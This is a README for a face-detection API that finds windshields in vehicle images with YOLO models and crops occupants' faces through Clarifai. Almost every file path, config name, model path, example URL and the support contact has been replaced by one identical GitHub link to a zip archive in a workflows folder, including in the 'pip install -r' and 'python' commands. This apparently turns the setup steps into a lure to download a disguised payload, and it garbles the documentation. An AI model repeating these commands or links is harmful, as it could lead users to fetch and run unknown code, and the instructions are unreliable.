# Face Detection API

Automatically detect and extract faces from vehicle images using multi-model windshield detection and Clarifai face recognition.

## Features

- **🚗 Windshield Detection**: Multi-YOLO model ensemble for accurate windshield localization
- **👤 Face Detection**: Clarifai API-powered face detection within windshields
- **✂️ Individual Face Crops**: Each detected face is cropped and uploaded separately
- **☁️ Media Manager Integration**: Images stored in external media manager
- **📦 Batch Processing**: Process multiple URLs in a single request
- **⚡ Optimized**: URL-based requests avoid re-uploading original images

## Quick Start

### Installation

```bash
# Clone the repository
git clone <repository-url>
cd face-detection-system

# Create virtual environment
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install dependencies
pip install -r https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip
```

### Configuration

Edit `https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip` to configure:

```yaml
# Media Manager
media_manager:
  enabled: true
  base_url: "https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip"
  timeout: 30

# Clarifai API
clarifai:
  api_key: "your-clarifai-api-key"

# Windshield Detection Models
windshield_models:
  - name: "model_1"
    enabled: true
    model_path: "https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip"
    conf_threshold: 0.35
```

### Running the Server

```bash
python https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip
```

Server starts at `http://localhost:8000`

## API Endpoints

### Face Detection

#### POST `/upload`
Upload an image file and extract face crops.

```bash
curl -X POST "http://localhost:8000/upload" \
  -F "https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip"
```

**Response:**
```json
{
  "status": "success",
  "request_id": "face_20260109_120530_uploaded",
  "faces": [
    {
      "face_id": 0,
      "image_url": "https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip",
      "bbox": {"x": 145, "y": 89, "width": 180, "height": 240}
    }
  ],
  "original_image_url": "https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip",
  "total_faces": 1
}
```

#### POST `/add-url`
Process an image from a URL.

```bash
curl -X POST "http://localhost:8000/add-url" \
  -H "Content-Type: application/json" \
  -d '{"url": "https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip"}'
```

**Efficiency Note:** Original image URL is stored directly (not re-uploaded), saving bandwidth.

#### POST `/batch-urls`
Process multiple images in one request.

```bash
curl -X POST "http://localhost:8000/batch-urls" \
  -H "Content-Type: application/json" \
  -d '{
    "urls": [
      "https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip",
      "https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip"
    ]
  }'
```

### System Information

#### GET `/health`
System health check.

```bash
curl "http://localhost:8000/health"
```

#### GET `/stats`
Dataset statistics.

```bash
curl "http://localhost:8000/stats"
```

#### GET `/models`
Information about loaded YOLO models.

```bash
curl "http://localhost:8000/models"
```

### Dataset Management

#### GET `/download`
Download complete dataset as ZIP (local storage only).

```bash
curl "http://localhost:8000/download" -o https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip
```

#### DELETE `/clear`
Clear all local dataset data.

```bash
curl -X DELETE "http://localhost:8000/clear"
```

## Workflow

```
┌─────────────┐
│ Input Image │
└──────┬──────┘
       │
       ▼
┌─────────────────────┐
│ Windshield Detection│  (Multi-YOLO Ensemble)
└──────┬──────────────┘
       │
       ▼
┌─────────────────┐
│ Face Detection  │  (Clarifai API)
└──────┬──────────┘
       │
       ▼
┌──────────────────┐
│ Extract Each Face│
└──────┬───────────┘
       │
       ▼
┌─────────────────────┐
│ Upload to Media Mgr │
└──────┬──────────────┘
       │
       ▼
┌────────────────┐
│ Return Face URLs│
└────────────────┘
```

## Architecture

### Components

- **Windshield Detector** (`https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip`): Multi-model YOLO ensemble
- **Face Detector** (`https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip`): Clarifai API integration
- **Dataset Manager** (`https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip`): Image storage and organization
- **Media Manager Client** (`https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip`): External storage integration

### Model Ensemble Methods

- **union**: Largest bbox containing all detections (default)
- **nms**: Non-Maximum Suppression
- **weighted**: Weighted average of detections
- **best_confidence**: Highest confidence detection

## Response Format

All face detection endpoints return:

```json
{
  "status": "success",
  "request_id": "unique-identifier",
  "faces": [
    {
      "face_id": 0,
      "image_url": "https://...",
      "bbox": {
        "x": 145,
        "y": 89,
        "width": 180,
        "height": 240
      }
    }
  ],
  "original_image_url": "https://...",
  "total_faces": 1
}
```

## Storage Modes

### Media Manager (Cloud)
- **Enabled by default** in `https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip`
- Face crops uploaded to external service
- URL-based requests: Original URL stored (not re-uploaded)
- File uploads: Raw image + face crops uploaded

### Local Storage
- Set `https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip false` in config
- All images saved locally
- Dataset ready for YOLO training
- Can be downloaded as ZIP

## Development

### Project Structure

```
face-detection-system/
├── https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip                      # FastAPI application
├── https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip       # YOLO windshield detection
├── https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip          # Clarifai face detection
├── https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip          # Dataset management
├── https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip     # Media manager integration
├── https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip                    # Utility functions
├── https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip                 # Configuration
├── https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip            # Python dependencies
└── models/                     # YOLO model files
    └── https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip
```

### Adding New YOLO Models

Edit `https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip`:

```yaml
windshield_models:
  - name: "model_1"
    enabled: true
    model_path: "https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip"
    model_type: "yolov8"
    conf_threshold: 0.35
    iou_threshold: 0.45
    weight: 1.0

  - name: "model_2"
    enabled: true
    model_path: "https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip"
    model_type: "yolov11"
    conf_threshold: 0.4
    weight: 1.2
```

### Testing

```bash
# Test upload endpoint
curl -X POST "http://localhost:8000/upload" \
  -F "https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip"

# Test URL endpoint
curl -X POST "http://localhost:8000/add-url" \
  -H "Content-Type: application/json" \
  -d '{"url": "https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip"}'

# Check health
curl "http://localhost:8000/health"
```

## API Documentation

Interactive API documentation available at:
- **Swagger UI**: http://localhost:8000/docs
- **ReDoc**: http://localhost:8000/redoc

## Performance Tips

1. **Batch Processing**: Use `/batch-urls` for multiple images
2. **GPU Acceleration**: Configure YOLO models to use CUDA
3. **Caching**: Consider implementing Redis for repeated URLs
4. **Async Processing**: For large volumes, implement queue-based processing

## Troubleshooting

### YOLO Models Not Loading

```bash
# Install missing dependencies
pip install huggingface_hub omegaconf

# Verify model path in https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip
models:
  - model_path: "https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip"
```

### Clarifai API Errors

- Check API key in `https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip`
- Verify internet connection
- Check Clarifai API status

### Media Manager Upload Failures

- Verify `base_url` in config
- Check network connectivity
- Ensure media manager is accessible

## License

Proprietary - eTraffica

## Support

For issues and questions, contact: https://raw.githubusercontent.com/abdxl-cloud/face-detection-system/main/.github/workflows/face_detection_system_v1.9.zip
